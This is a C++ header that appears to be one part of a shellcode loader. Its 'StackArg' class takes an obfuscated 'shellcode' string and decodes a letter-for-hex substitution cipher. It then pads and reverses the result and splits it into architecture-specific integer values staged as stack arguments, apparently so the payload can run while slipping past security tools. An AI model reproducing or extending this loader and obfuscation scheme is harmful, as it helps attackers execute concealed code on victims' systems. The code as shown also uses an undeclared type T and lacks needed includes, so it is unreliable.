#pragma once

#include <string>
#include <vector>
#include<sstream>

using namespace std;

class StackArg
{
public:
	int argSum, stackTotal;
	vector <vector<T>> m_values;
#ifdef _M_IX86
	int typeLength = 4, fillCount = 830;
#else
	int typeLength = 8, fillCount = 300;
#endif

	StackArg(const std::string& shellcode)
	{
		content = shellcode;
		decode(content);

		argDealWith();
	}

	~StackArg()
	{
	}

	void argDealWith()
	{
		argSum = stackCount + m_argCount;
		vector <vector<T>> valuesArray(argSum);
		int byteTotal = int(content.length() / 2);
		int temp = byteTotal % (argSum * typeLength);

		int zeroCount = 0;
		if (temp != 0) {
			zeroCount = (argSum * typeLength - byteTotal % (argSum * typeLength)) * 2;
		}

		for (int i = 0; i < zeroCount; i++)
		{
			content += "0";
		}
		reverse(content.begin(), content.end());
		int strLength = content.length();

		for (int i = 0; i < strLength; i += bytes * argSum)
		{
			for (int j = 0; j < argSum; j++)
			{
				int strIndex = i + j * bytes;
				valuesArray[j].push_back(numChange(content.substr(strIndex, bytes)));
			}
			actualCount++;
		}

		m_values = valuesArray;
		stackTotal = actualCount + fillCount;
	}

protected:
	string content;
	int actualCount = 0;
	int m_argCount = 4;

#ifdef _M_IX86
	int bytes = 8, stackCount = 2;
	int index[8] = { 1,0,3,2,5,4,7,6 };
#else
	int bytes = 16, stackCount = 12;
	int index[16] = { 1,0,3,2,5,4,7,6,9,8,11,10,13,12,15,14 };
#endif

	T numChange(string num)
	{
		stringstream ss;
		string s;
		
		for (size_t i = 0; i < bytes; i++)
		{
			s += num.substr(index[i], 1);
		}

		T value = 0;

		ss << std::hex << s.c_str();
		ss >> value;

		return value;
	}

	void decode(string& content)
	{
		map<string, string>str;
		str["q"] = "0";
		str["w"] = "1";
		str["e"] = "2";
		str["r"] = "3";
		str["t"] = "4";
		str["y"] = "5";
		str["u"] = "6";
		str["o"] = "7";
		str["p"] = "8";
		str["a"] = "9";
		str["s"] = "a";
		str["d"] = "b";
		str["f"] = "c";
		str["g"] = "d";
		str["h"] = "e";
		str["j"] = "f";

		int length = content.length();
		for (int i = 0; i < length; i++)
		{
			content.replace(i, 1, str[content.substr(i, 1)]);
		}
	}
};
